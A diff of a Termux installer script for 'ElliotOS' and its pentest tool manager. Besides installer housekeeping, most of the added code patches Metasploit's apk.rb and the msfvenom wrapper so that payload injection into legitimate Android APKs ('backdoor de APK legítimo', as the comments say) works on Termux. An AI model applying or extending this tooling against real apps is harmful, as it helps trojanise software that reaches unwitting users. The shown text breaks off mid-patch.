@@ -40,7 +40,7 @@ _run_uninstall() {
     printf "  \033[1;32m  ✓ Build dir removido\033[0m\n"
 
     printf "  \033[1;36m[*] Removendo módulos e scripts...\033[0m\n"
-    rm -rf "$_TPFX/share/lua-scripts" "$_TPFX/share/lua-modules" \
+    rm -rf "$_TPFX/share/lua-scripts" "$_TPFX/share/c-scripts" "$_TPFX/share/lua-modules" \
            "$_TPFX/share/lua/5.4/ell.lua"
     printf "  \033[1;32m  ✓ Módulos removidos\033[0m\n"
 
@@ -62,6 +62,11 @@ _run_uninstall() {
     sed -i '/lua-net\|lpm_lua_path\|LUA_PATH.*lua-modules\|LUA_PATH.*luarocks\|LUA_CPATH.*luarocks\|GEMINI_API_KEY\|AI_KEY\|NPM_BIN_PATH\|elliotos_auth_check\|_elliotos_auth_check/d' \
         "$HOME/.bashrc" 2>/dev/null || true
     printf "  \033[1;32m  ✓ .bashrc limpo\033[0m\n"
+
+    printf "  \033[1;36m[*] Limpando .inputrc...\033[0m\n"
+    sed -i '/# ── ElliotOS: readline/,/# ─\{10,\}/d' \
+        "$HOME/.inputrc" 2>/dev/null || true
+    printf "  \033[1;32m  ✓ .inputrc limpo\033[0m\n"
 
     if [ "${INSTALL_UNINSTALL_ALL:-0}" = "1" ]; then
         printf "  \033[1;36m[*] Removendo dados do usuário...\033[0m\n"
@@ -474,6 +479,7 @@ BIN="${BIN_DIR}/lua-net"
 BUILD_DIR="$HOME/.lua-net-build"
 CACHE_DIR="$HOME/.lua-cache"
 SCRIPTS_DIR="$PREFIX/share/lua-scripts"
+C_SCRIPTS_DIR="$PREFIX/share/c-scripts"
 MODULES_DIR="$PREFIX/share/lua-modules"
 LUA_VERSION="5.4.8"
 LUA_TAR="lua-${LUA_VERSION}.tar.gz"
@@ -516,7 +522,7 @@ if [ "$INSTALL_UNINSTALL" = "1" ]; then
 fi
 
 setup_dirs() {
-    mkdir -p "$BUILD_DIR" "$CACHE_DIR" "$SCRIPTS_DIR" "$MODULES_DIR"
+    mkdir -p "$BUILD_DIR" "$CACHE_DIR" "$SCRIPTS_DIR" "$C_SCRIPTS_DIR" "$MODULES_DIR"
     mkdir -p "$HOME/.elliotai"
     mkdir -p "$HOME/.lua-modules"
     # Registra ~/.lua-modules no LUA_PATH para que require() encontre os módulos do lmod
@@ -27787,7 +27793,8 @@ install_elliotos() {
     mkdir -p "$_LOCK_DIR"
     if [ -f "$_LOCK_FILE" ]; then
         _LOCK_PID=$(cat "$_LOCK_FILE" 2>/dev/null)
-        if kill -0 "$_LOCK_PID" 2>/dev/null; then
+        # Ignora o lock se o PID for o proprio processo (chamada interna, ex: --gui chama install_elliotos)
+        if [ "$_LOCK_PID" != "$$" ] && kill -0 "$_LOCK_PID" 2>/dev/null; then
             printf "\033[1;31m[✗] Outra instalação do ElliotOS já está em andamento (PID $_LOCK_PID).\033[0m\n"
             printf "\033[0;90m    Se isso for um erro, remova: $_LOCK_FILE\033[0m\n"
             exit 1
@@ -34979,6 +34986,7 @@ static void _elliot_print_logo(void) {
            Y, W, Y, B, Y, P, R);
     /* sublinha decorativa baixo */
     printf("  %s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌%s\n\n",P,B,B,Y,P,C,R);
+    fflush(stdout); /* garante exibição imediata no REPL — stdout pode estar em buffer */
 }
 
 /* lg() — exibe apenas o logo do ElliotOS */
@@ -92666,6 +92674,7 @@ TMP_DIR="${TMPDIR:-$PREFIX/tmp}/lpm_$$"
 R="\033[0m"; G="\033[1;32m"; Y="\033[1;33m"; B="\033[1;36m"; E="\033[1;31m"
 _ok()      { printf "${G}  ✓ %s${R}\n" "$1"; }
 _info()    { printf "${B}  → %s${R}\n" "$1"; }
+_warn()    { printf "${Y}  ! %s${R}\n" "$1"; }
 _err()     { printf "${E}  ✗ %s${R}\n" "$1"; rm -rf "$TMP_DIR" 2>/dev/null; [ "$_LPM_ALL_MODE" = "1" ] && return 1 || exit 1; }
 _LPM_ALL_MODE=0
 
@@ -92932,6 +92941,49 @@ _install() {
     local from="${2:-auto}"
     mkdir -p "$LIB_DIR" "$LUA_DIR"
     _info "Instalando $pkg..."
+    # Pacotes C que existem no Termux como binários — não compiláveis pelo lpm
+    case "$pkg" in
+        lgi|lua-lgi)
+            _info "lgi é um binding C (GObject/GTK) — instalando via pkg..."
+            pkg install -y lua-lgi 2>/dev/null || _err "Falha: tente pkg install lua-lgi"
+            # Localiza o .so instalado e garante que está no LUA_CPATH
+            _lgi_so=$(find "${PREFIX:-/data/data/com.termux/files/usr}/lib/lua" \
+                -name "corelgilua*.so" 2>/dev/null | head -1)
+            if [ -z "$_lgi_so" ]; then
+                _lgi_so=$(find "${PREFIX:-/data/data/com.termux/files/usr}" \
+                    -name "corelgilua*.so" 2>/dev/null | head -1)
+            fi
+            if [ -n "$_lgi_so" ]; then
+                _lgi_dir="$(dirname "$_lgi_so")"
+                # Cpath correto: parent do diretorio lgi (ex: /usr/lib/lua/5.4/?.so)
+                # lgi.corelgilua51 vira lgi/corelgilua51.so — precisa de ?.so na raiz
+                _lgi_cpath_root="$(dirname "$_lgi_dir")"
+                # Remove entrada antiga errada se existir
+                sed -i '/lgi_cpath/d' "$HOME/.bashrc" 2>/dev/null
+                sed -i '/lua\/.*\/lgi\/\\\?/d' "$HOME/.bashrc" 2>/dev/null
+                if ! grep -q "lgi_cpath" "$HOME/.bashrc" 2>/dev/null; then
+                    printf '\n# lgi_cpath\nexport LUA_CPATH="%s/?.so;${LUA_CPATH:-}"\n' \
+                        "$_lgi_cpath_root" >> "$HOME/.bashrc"
+                    export LUA_CPATH="$_lgi_cpath_root/?.so:${LUA_CPATH:-}"
+                fi
+                _ok "lgi instalado — .so em: $_lgi_dir (cpath: $_lgi_cpath_root/?.so)"
+            else
+                _warn "lgi instalado mas .so nao localizado — pode nao funcionar com Lua 5.4"
+            fi
+            return ;;
+        luaposix|posix)
+            _info "luaposix é um binding C — instalando via pkg..."
+            pkg install -y lua-posix 2>/dev/null \
+                && _ok "luaposix instalado via pkg (lua-posix)" \
+                || _err "Falha ao instalar lua-posix — tente: pkg install lua-posix"
+            return ;;
+        lcurl|curl)
+            _info "lcurl é um binding C — instalando via pkg..."
+            pkg install -y lua-curl 2>/dev/null \
+                && _ok "lcurl instalado via pkg (lua-curl)" \
+                || _err "Falha ao instalar lua-curl — tente: pkg install lua-curl"
+            return ;;
+    esac
     case "$pkg" in
         luasocket|socket) _install_luasocket ;;
         ansicolors)       _install_ansicolors ;;
@@ -93438,6 +93490,7 @@ LPMEOF
     # ── Instala xpm (eXtended Pentest Manager) ───────────────────────────────
     _step "🛡️" "Instalando xpm (ElliotOS eXtended Pentest Manager)..."
     _TPFX="${PREFIX:-/data/data/com.termux/files/usr}"
+
     cat > "${_TPFX}/bin/xpm" << 'XPMEOF'
 #!/usr/bin/env bash
 # xpm — ElliotOS eXtended Pentest Manager
@@ -93451,7 +93504,7 @@ XPM_CACHE="$XPM_HOME/cache"
 XPM_META="$XPM_HOME/meta"
 XPM_INSTALLED="$XPM_HOME/installed"
 XPM_TMP="${TMPDIR:-$PREFIX/tmp}/xpm_$$"
-XPM_VERSION="1.4.0"
+XPM_VERSION="1.4.1"
 
 R=$'\033[0m'; G=$'\033[1;32m'; Y=$'\033[1;33m'; B=$'\033[1;36m'
 E=$'\033[1;31m'; M=$'\033[1;35m'; W=$'\033[1;37m'; DIM=$'\033[0;90m'
@@ -93774,6 +93827,32 @@ TOOLEOF
         "apktool" "iBotPeaches/Apktool" \
         "yes" "Requer OpenJDK; usado também pelo metasploit para embutir payloads em APKs (backdoor)"
 
+    _mk apkfull \
+        "Kit completo de ferramentas APK: apktool + apksigner + aapt + aapt2 + apkeep" \
+        "Android" \
+        "android,apk,apktool,apksigner,aapt,aapt2,apkeep,kit,sign,decompile" \
+        "pkg" "linux,android" "all" \
+        "apkfull" "" \
+        "yes" "Instala via pkg do Termux: apktool apksigner aapt aapt2 apkeep — compatível com msfvenom -x"
+
+    _mk apkeditor \
+        "APKEditor — desmonta/monta APKs modernos com suporte nativo a assinatura, split APKs e recursos binários" \
+        "Android" \
+        "android,apk,apkeditor,decompile,build,sign,split,modern" \
+        "pkg" "linux,android" "all" \
+        "apkeditor" "" \
+        "yes" "Requer tur-repo (instalado automaticamente). Uso: apkeditor d -i app.apk / apkeditor b -i pasta/"
+
+
+    # ── BUILD / WEB ───────────────────────────────────────────────────────────
+    _mk web2apk \
+        "Converte diretório HTML/CSS/JS em APK Android real — sem root, sem Android Studio" \
+        "Android" \
+        "web,html,css,js,apk,webview,build,converter,pwa" \
+        "Bash+Java" "linux,android" "all" \
+        "web2apk" "" \
+        "yes" "Requer aapt2 ecj dx apksigner. android.jar API 33 baixado automaticamente (~14MB, única vez)"
+
     # ── REDE / SNIFFING / MITM ────────────────────────────────────────────────
     _mk mitmproxy \
         "Proxy interativo para interceptar, inspecionar e modificar tráfego HTTP/HTTPS sem root" \
@@ -93875,37 +93954,18 @@ _install_sherlock_no_pandas() {
     local target="$dest/sherlock_project/sherlock.py"
     [ -f "$target" ] || return 1
 
-    # Remove o import e o bloco de exportacao xlsx (usa pd.DataFrame/.to_excel)
-    # via Python, mais seguro que sed para blocos multilinha com parenteses.
-    python3 - "$target" << 'PYEOF'
-import re, sys
-path = sys.argv[1]
-with open(path, "r", encoding="utf-8") as f:
-    src = f.read()
-
-# Remove o import direto
-src = re.sub(r'^import pandas as pd\n', '', src, flags=re.MULTILINE)
-
-# Remove o bloco "if args.xlsx:" inteiro (ate a proxima linha no mesmo nivel de indentacao)
-lines = src.split("\n")
-out = []
-skip_indent = None
-for line in lines:
-    if skip_indent is not None:
-        # ainda dentro do bloco se a linha tem indentacao maior que skip_indent ou é vazia
-        stripped = line.rstrip()
-        if stripped == "" or (len(line) - len(line.lstrip(" "))) > skip_indent:
-            continue
-        skip_indent = None
-    if re.match(r'^(\s*)if\s+args\.xlsx\s*:', line):
-        skip_indent = len(line) - len(line.lstrip(" "))
-        continue
-    out.append(line)
-src = "\n".join(out)
-
-with open(path, "w", encoding="utf-8") as f:
-    f.write(src)
-PYEOF
+    # Remove import pandas e bloco xlsx (sed + awk, sem python)
+    sed -i '/^import pandas as pd$/d' "$target"
+    awk '
+      /^[[:space:]]*if[[:space:]]+args\.xlsx[[:space:]]*:/ { skip=1; indent=0; match($0,/^[[:space:]]*/); indent=RLENGTH; next }
+      skip {
+        if (/^[[:space:]]*$/) next
+        match($0,/^[[:space:]]*/); cur=RLENGTH
+        if (cur > indent) next
+        skip=0
+      }
+      { print }
+    ' "$target" > "${target}.tmp" && mv "${target}.tmp" "$target"
 
     # Remove pandas/openpyxl do pyproject.toml para o pip nao tentar buscar de novo
     local pyproj="$dest/pyproject.toml"
@@ -94039,71 +94099,22 @@ _backend_msf() {
     # Dependência do metasploit: msfvenom usa apktool para decompilar/recompilar
     # APKs na hora de embutir payloads Android (backdoor de APK legítimo).
     # Não existe no repo do Termux, então instalamos via xpm/apktool backend.
-    local _apktool_bin; _apktool_bin="$(command -v apktool 2>/dev/null)"
+    hash -r 2>/dev/null || true
+    local _apktool_bin; _apktool_bin="$(command -v apktool 2>/dev/null || echo "${PREFIX:-/data/data/com.termux/files/usr}/bin/apktool")"
+    [ -f "$_apktool_bin" ] || _apktool_bin=""
     local _apktool_ver
     if [ -n "$_apktool_bin" ]; then
         _apktool_ver="$("$_apktool_bin" --version 2>/dev/null | head -1)"
     fi
     if [ -z "$_apktool_bin" ]; then
-        _info "apktool não encontrado — instalando (dependência do metasploit)..."
-        _backend_apktool
-        _mark_installed "apktool" 2>/dev/null || true
-    elif ! grep -q "XPM_APKTOOL_WRAPPER_V14" "$_apktool_bin" 2>/dev/null; then
-        # Wrapper de uma instalação anterior a qualquer uma destas correções:
-        # flags do apktool 3.x (V2), auto-fix de recursos "$"-prefixados (V3),
-        # pin do aapt2 + verificação de compatibilidade (V4), renomear em vez
-        # de deletar recursos "$" + --frame-path fixo (V5), parsing correto
-        # do diretório-alvo (V6), placeholder pra símbolos órfãos de arquivo
-        # (V7), placeholder pra símbolos órfãos de valor (V8), deduplicação
-        # de símbolos repetidos (V9), a reescrita de performance das funções
-        # de símbolos órfãos (V10), o fix de falso-positivo em ids órfãos
-        # (V11), a quarentena de recursos XML corrompidos/adulterados (V12),
-        # o fix de falso-positivo em cores órfãs (V13 — tipo "color" é
-        # dual igual "drawable": pode ser valor simples OU arquivo seletor
-        # de estado em res/color/nome.xml; sem checar isso, QUALQUER app
-        # usando Material Components/AppCompat — ou seja, quase todo app
-        # real — gerava placeholder duplicado pras cores abc_*/m3_*/mtrl_*
-        # e o aapt2 recusava o link com "has a conflicting value for
-        # configuration ()"), ou o heap de JVM adaptativo (V14 — -Xmx fixo
-        # ou é pouco pra APKs grandes/jogos [250MB+, muitos dex] ou passa da
-        # RAM real do aparelho, o que faz o Android matar o processo sem
-        # log nenhum; agora calcula a partir de /proc/meminfo, e o backend
-        # também baixa o apktool 3.x como motor de fallback OPCIONAL — só
-        # usado pelo "ms --apk", nunca pelo msfvenom). Regenera o wrapper e
-        # reexecuta o pin do aapt2 pra cobrir todos os casos.
-        _info "Corrigindo wrapper antigo do apktool (fix flags 3.x + fix recursos \$-prefixados + fix aapt2 pinado + fix parsing do diretório-alvo + fix símbolos órfãos + fix deduplicação + fix PERFORMANCE crítica + fix falso-positivo em ids órfãos + fix quarentena de XML corrompido/adulterado + fix falso-positivo em cores órfãs + fix heap adaptativo)..."
-        _backend_apktool
+        _info "apktool não encontrado — instalando kit APK (dependência do metasploit)..."
+        _backend_apkfull
+        _mark_installed "apkfull" 2>/dev/null || true
     elif printf '%s' "$_apktool_ver" | grep -qE '^3\.'; then
-        # apktool 3.x removeu "--only-main-classes", flag que o próprio
-        # metasploit usa fixa no código pra decodificar o APK original.
-        # Sem downgrade pra 2.x, o msfvenom SEMPRE vai falhar nesse passo.
-        _info "apktool $_apktool_ver é incompatível com o msfvenom — baixando versão 2.x fixada..."
-        _backend_apktool
+        _info "apktool $_apktool_ver (3.x) detectado — reinstalando via pkg pra garantir compatibilidade com msfvenom..."
+        _backend_apkfull
     else
         _ok "apktool já instalado ($_apktool_ver)"
-
-        # Checagem independente da versão do wrapper: instalações feitas
-        # antes desse fix tinham "aapt2-real" como uma CÓPIA (cp) do binário
-        # do Termux, não um link simbólico. Uma cópia fica congelada — se
-        # depois disso rodar "pkg upgrade" e libprotobuf/libabsl mudarem de
-        # ABI (comum, essas libs quebram compatibilidade entre versões), a
-        # cópia passa a falhar com "CANNOT LINK EXECUTABLE ... cannot
-        # locate symbol ..." (erro do linker dinâmico do Android), mesmo
-        # com o wrapper já na versão mais recente — por isso essa checagem
-        # roda sempre, não só quando o marcador do wrapper muda.
-        local _apktool_dest="$HOME/.xpm/tools/apktool"
-        if [ -f "$_apktool_dest/aapt2-real" ] && [ ! -L "$_apktool_dest/aapt2-real" ]; then
-            _info "aapt2-real é uma cópia antiga (não symlink) — pode quebrar após 'pkg upgrade'. Corrigindo..."
-            local _aapt2_live
-            _aapt2_live="$(command -v aapt2 2>/dev/null || echo "$BPFX/bin/aapt2")"
-            if [ -x "$_aapt2_live" ]; then
-                rm -f "$_apktool_dest/aapt2-real"
-                ln -sf "$_aapt2_live" "$_apktool_dest/aapt2-real"
-                _ok "aapt2-real agora é um symlink — acompanha automaticamente futuros 'pkg upgrade'"
-            else
-                _warn "aapt2 não encontrado no sistema — não foi possível corrigir aapt2-real"
-            fi
-        fi
     fi
 
     # apksigner é usado pelo apktool/msfvenom pra assinar o APK depois do
@@ -94112,6 +94123,16 @@ _backend_msf() {
     if ! command -v apksigner &>/dev/null; then
         _info "apksigner não encontrado — instalando (dependência do metasploit)..."
         pkg install -y apksigner 2>/dev/null || _warn "Falha ao instalar apksigner — assine o APK manualmente depois"
+    fi
+
+    # Mesma lógica de cobertura pro zipalign: quem instalou o apktool antes
+    # do "ms --apk" ganhar validação real de instalabilidade (V15) não tem
+    # esse binário ainda. Sem ele não dá pra alinhar o APK corretamente
+    # antes de assinar — e o APK Signature Scheme v2/v3 exige exatamente
+    # essa ordem (alinhar depois de assinar invalida a assinatura).
+    if ! command -v zipalign &>/dev/null; then
+        _info "zipalign não encontrado — instalando (necessário pro 'ms --apk' validar instalação)..."
+        pkg install -y zipalign 2>/dev/null || _warn "Falha ao instalar zipalign — 'ms --apk' vai pular a validação de alinhamento/instalação"
     fi
 
     # ── 3. Clona o repositório ────────────────────────────────────────────────
@@ -94220,10 +94241,43 @@ export TERM="${TERM:-xterm-256color}"
 export BUNDLE_GEMFILE="$dest/Gemfile"
 export GEM_HOME="$gems"
 export GEM_PATH="$gems:$gdp"
-export PATH="$gems/bin:${PREFIX:-/data/data/com.termux/files/usr}/bin:$PATH"
+export PATH="$HOME/.local/bin:$gems/bin:${PREFIX:-/data/data/com.termux/files/usr}/bin:$PATH"
 export LD_LIBRARY_PATH="${PREFIX:-/data/data/com.termux/files/usr}/lib:\${LD_LIBRARY_PATH:-}"
+
+# ── heap adaptativo para o apktool interno do msfvenom ──────────────────────
+# O msfvenom usa um apktool embutido (java -jar) pra decompilar/recompilar
+# APKs com -x. Por padrão a JVM filho herda o heap padrão (~256m), que
+# estoura com APKs grandes mesmo que a RAM do aparelho tenha sobrado.
+# _JAVA_OPTIONS é lido por QUALQUER JVM filha — incluindo o apktool interno
+# do msfvenom — sem precisar modificar o código do Metasploit.
+# Calcula 75% da MemAvailable, com mínimo de 512m e máximo de 4096m.
+_MSF_XMX="\$(awk '/^MemAvailable:/{v=int(\$2*0.75/1024); if(v<512)v=512; if(v>4096)v=4096; print v; f=1} END{if(!f)print 1536}' /proc/meminfo 2>/dev/null)"
+[ -z "\$_MSF_XMX" ] && _MSF_XMX=1536
+export _JAVA_OPTIONS="-Xmx\${_MSF_XMX}m"
+
+# Resolve -x e -o para absoluto antes do cd (o bundle exec precisa do cd
+# pra encontrar .bundle/config; sem cd trava silenciosamente).
+_msf_args=()
+_msf_next_abs=0
+for _msf_a in "\$@"; do
+    if [ "\$_msf_next_abs" = "1" ]; then
+        case "\$_msf_a" in
+            /*) : ;;
+            *)
+                if [ -e "\$_msf_a" ]; then
+                    _msf_a="\$(readlink -f "\$_msf_a" 2>/dev/null || echo "\$PWD/\$_msf_a")"
+                else
+                    _msf_a="\$PWD/\$_msf_a"
+                fi
+                ;;
+        esac
+        _msf_next_abs=0
+    fi
+    case "\$_msf_a" in -x|-o) _msf_next_abs=1 ;; esac
+    _msf_args+=("\$_msf_a")
+done
 cd "$dest" || exit 1
-exec bundle exec "$msf_bin" "\$@"
+exec bundle exec "$msf_bin" "\${_msf_args[@]}"
 WEOF
         chmod +x "$BPFX/bin/$msf_bin"
         _ok "Wrapper: $msf_bin"
@@ -94250,9 +94304,8 @@ export TERM="${TERM:-xterm-256color}"
 export BUNDLE_GEMFILE="$dest/Gemfile"
 export GEM_HOME="$gems"
 export GEM_PATH="$gems:$gdp"
-export PATH="$gems/bin:${PREFIX:-/data/data/com.termux/files/usr}/bin:$PATH"
+export PATH="$HOME/.local/bin:$gems/bin:${PREFIX:-/data/data/com.termux/files/usr}/bin:$PATH"
 export LD_LIBRARY_PATH="${PREFIX:-/data/data/com.termux/files/usr}/lib:\${LD_LIBRARY_PATH:-}"
-cd "$dest" || exit 1
 export RUBYOPT="\${RUBYOPT:-} -W0"
 
 if [ "\${ELLIOT_BANNER:-1}" = "1" ]; then
@@ -94283,8 +94336,389 @@ WEOF
     # que o postgresql do Termux esta pronto e roda "msfdb init" uma vez.
     _msf_init_database "$BPFX" "$gems" "$gdp" "$dest"
 
+    # ── 10. Fix TMPDIR no apk.rb — msfvenom -x usa /tmp hardcoded ────────────
+    # No Termux /tmp não existe; o apk.rb chama apktool internamente e os
+    # arquivos temporários ficam em /tmp/... que nunca é criado, causando
+    # "No such file or directory @ rb_sysopen - .../original/AndroidManifest.xml"
+    # Fix: injetar ENV['TMPDIR'] no topo de backdoor_apk — idempotente.
+    _msf_fix_apkrb_tmpdir "$dest"
+
     _ok "Metasploit instalado! Execute: msfconsole"
     _warn "Primeira execucao demora ~1-2min para carregar modulos."
+}
+
+# Fix TMPDIR no apk.rb do Metasploit — msfvenom -x usa /tmp hardcoded.
+# No Termux /tmp não existe, só $PREFIX/tmp. Sem isso o msfvenom -x falha com:
+#   "No such file or directory @ rb_sysopen - .../original/AndroidManifest.xml"
+# Fix do apk.rb do Metasploit para funcionar com APKEditor no Termux.
+# 5 patches idempotentes (marcadores V2).
+_msf_fix_apkrb_tmpdir() {
+    local dest="$1"
+    local apkrb="$dest/lib/msf/core/payload/apk.rb"
+    [ -f "$apkrb" ] || { _warn "apk.rb nao encontrado — pulando fix"; return 1; }
+
+    # Fix 1: TMPDIR
+    if grep -q 'MSF_TMPDIR_FIX_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: TMPDIR ja configurado (V2)"
+    else
+        _info "apk.rb fix 1: TMPDIR..."
+        sed -i '/MSF_TMPDIR_FIX_V1/d' "$apkrb" 2>/dev/null
+        sed -i "/def backdoor_apk/a\\    ENV['TMPDIR'] ||= '${TMPDIR:-/data/data/com.termux/files/usr/tmp}' # MSF_TMPDIR_FIX_V2" \
+            "$apkrb" 2>/dev/null
+        grep -q 'MSF_TMPDIR_FIX_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: TMPDIR configurado" || _warn "Fix 1 nao aplicado"
+    fi
+
+    # Fix 2: remove --only-main-classes
+    if grep -q 'MSF_APKTOOL_FLAGS_FIX_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: flags ja corrigidas (V2)"
+    else
+        _info "apk.rb fix 2: --only-main-classes..."
+        sed -i '/MSF_APKTOOL_FLAGS_FIX_V1/d' "$apkrb" 2>/dev/null
+        sed -i "s/'--only-main-classes', //g;s/\"--only-main-classes\", //g" "$apkrb" 2>/dev/null
+        sed -i "/MSF_TMPDIR_FIX_V2/a\\    # MSF_APKTOOL_FLAGS_FIX_V2: --only-main-classes removed" \
+            "$apkrb" 2>/dev/null
+        grep -q 'MSF_APKTOOL_FLAGS_FIX_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: flags corrigidas" || _warn "Fix 2 nao aplicado"
+    fi
+
+    # Fix 3: versao minima apktool
+    if grep -q 'MSF_AE_MIN_VER_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: versao minima ja ajustada (V2)"
+    elif grep -q "min_required_apktool_version" "$apkrb" 2>/dev/null; then
+        _info "apk.rb fix 3: versao minima..."
+        sed -i "s/Rex::Version.new('2\.9\.2')/Rex::Version.new('2.0.0') # MSF_AE_MIN_VER_V2/" "$apkrb" 2>/dev/null
+        grep -q 'MSF_AE_MIN_VER_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: versao minima -> 2.0.0" || _warn "Fix 3 nao aplicado"
+    else
+        _ok "apk.rb: check de versao minima nao encontrado (ok)"
+    fi
+
+    # Fix 4: run_cmd — popen3 → capture3 (evita deadlock)
+    if grep -q 'MSF_AE_RUN_CMD_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: run_cmd ja corrigido (V2)"
+    else
+        _info "apk.rb fix 4: run_cmd deadlock (capture3)..."
+        ruby - "$apkrb" << 'RBFIX4'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_RUN_CMD_V2')
+old = "  def run_cmd(cmd)\n    begin\n      stdin, stdout, stderr = Open3.popen3(*cmd)\n      return stdout.read + stderr.read\n    rescue Errno::ENOENT\n      return nil\n    end\n  end"
+new_cmd = "  def run_cmd(cmd) # MSF_AE_RUN_CMD_V2\n    begin\n      stdout_str, stderr_str, _status = Open3.capture3(*cmd)\n      return stdout_str + stderr_str\n    rescue Errno::ENOENT\n      return nil\n    end\n  end"
+result = src.include?(old) ? src.sub(old, new_cmd) :
+  src.gsub(/  def run_cmd\(cmd\).*?  end\n/m) { |m| m.include?('popen3') ? new_cmd + "\n" : m }
+File.write(ARGV[0], result)
+RBFIX4
+        grep -q 'MSF_AE_RUN_CMD_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: run_cmd corrigido" || _warn "Fix 4 nao aplicado"
+    fi
+
+    # Fix 5: hook_point — glob smali* com fallback recursivo
+    if grep -q 'MSF_AE_HOOK_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: hook_point ja corrigido (V2)"
+    else
+        _info "apk.rb fix 5: hook_point (smali* glob)..."
+        ruby - "$apkrb" << 'RBFIX5'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_HOOK_V2')
+
+# Marca o filename
+src = src.sub(
+  "hookable_class.to_s.gsub('.', '/') + '.smali'\n",
+  "hookable_class.to_s.gsub('.', '/') + '.smali' # MSF_AE_HOOK_V2\n"
+)
+
+# Substitui lookup de caminho unico por glob multi-path com fallback recursivo
+old5 = '    hookable_class_filepath = "#{tempdir}/original/smali/#{hookable_class_filename}"' + "\n" +
+       '    smalifile = Dir.glob(hookable_class_filepath).select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
+       "\n" +
+       '    if smalifile.blank?' + "\n" +
+       '      raise "Unable to find class file: #{hookable_class_filepath}"' + "\n" +
+       '    end'
+
+new5 = '    original_dir = "#{tempdir}/original"' + "\n" +
+       '    hookable_class_filepath = "#{original_dir}/smali*/#{hookable_class_filename}"' + "\n" +
+       '    smalifile = Dir.glob(hookable_class_filepath).select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
+       "\n" +
+       '    if smalifile.blank?' + "\n" +
+       '      # MSF_AE_CLASSES_PATH: APKEditor usa smali/classes/ em vez de smali/' + "\n" +
+       '      smalifile = Dir.glob("#{original_dir}/smali*/classes/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
+       '    end' + "\n" +
+       '    if smalifile.blank?' + "\n" +
+       '      smalifile = Dir.glob("#{original_dir}/smali*/**/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
+       '    end' + "\n" +
+       "\n" +
+       '    if smalifile.blank?' + "\n" +
+       '      raise "Unable to find class file: #{original_dir}/smali*/#{hookable_class_filename}"' + "\n" +
+       '    end'
+
+src = src.sub(old5, new5) if src.include?(old5)
+File.write(ARGV[0], src)
+RBFIX5
+        grep -q 'MSF_AE_HOOK_V2' "$apkrb" 2>/dev/null && grep -q 'MSF_AE_CLASSES_PATH' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: hook_point corrigido (V2+classes)" || _warn "Fix 5 nao aplicado"
+    fi
+
+    # Fix 9: FileUtils.rm — path correto (smali/classes/ vs smali/)
+    if grep -q 'MSF_AE_RM_FIX_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: FileUtils.rm ja com path correto (Fix 9)"
+    else
+        _info "apk.rb fix 9: FileUtils.rm smali/classes/ path..."
+        ruby - "$apkrb" << 'RBFIX9'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_RM_FIX_V2')
+
+# Aspas simples: #{tempdir} e #{_pay_stage} sao literais aqui (nao interpolados)
+old9 = '    FileUtils.rm "#{tempdir}/payload/smali/com/metasploit/stage/MainActivity.smali"' + "\n" +
+       '    FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")'
+
+new9 = '    # MSF_AE_RM_FIX_V2' + "\n" +
+       '    _pay_stage = Dir.exist?("#{tempdir}/payload/smali/classes") ?' + "\n" +
+       '      "#{tempdir}/payload/smali/classes/com/metasploit/stage" :' + "\n" +
+       '      "#{tempdir}/payload/smali/com/metasploit/stage"' + "\n" +
+       '    FileUtils.rm "#{_pay_stage}/MainActivity.smali" rescue nil' + "\n" +
+       '    FileUtils.rm Dir.glob("#{_pay_stage}/R*.smali")'
+
+src = src.sub(old9, new9) if src.include?(old9)
+File.write(ARGV[0], src)
+RBFIX9
+        grep -q 'MSF_AE_RM_FIX_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: RM path corrigido" || _warn "Fix 9 nao aplicado"
+    fi
+
+    # Fix 10: end orfao (sobra de fix anterior)
+    if grep -qF 'original_dir = "#{tempdir}/original"' "$apkrb" 2>/dev/null && \
+       grep -A3 'original_dir.*tempdir.*original' "$apkrb" 2>/dev/null | grep -qx '    end'; then
+        _info "apk.rb fix 10: removendo end orfao..."
+        ruby - "$apkrb" << 'RBFIX10'
+src = File.read(ARGV[0])
+old10 = "    original_dir = \"\#{tempdir}/original\"\n\n    end\n\n    hookable_class_filepath"
+new10 = "    original_dir = \"\#{tempdir}/original\"\n\n    hookable_class_filepath"
+File.write(ARGV[0], src.include?(old10) ? src.sub(old10, new10) : src)
+RBFIX10
+        _ok "apk.rb: end orfao removido"
+    else
+        _ok "apk.rb: sem end orfao (Fix 10 nao necessario)"
+    fi
+
+    # Fix GLOB: payload smali path (smali/classes/ vs smali/)
+    if grep -q 'MSF_AE_PAYLOAD_GLOB_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: payload glob ja corrigido"
+    else
+        _info "apk.rb fix glob: payload smali/classes/ path..."
+        ruby - "$apkrb" << 'RBFIXGLOB'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_PAYLOAD_GLOB_V2')
+old = "    payload_files = Dir.glob(\"\#{tempdir}/payload/smali/com/metasploit/stage/*.smali\")"
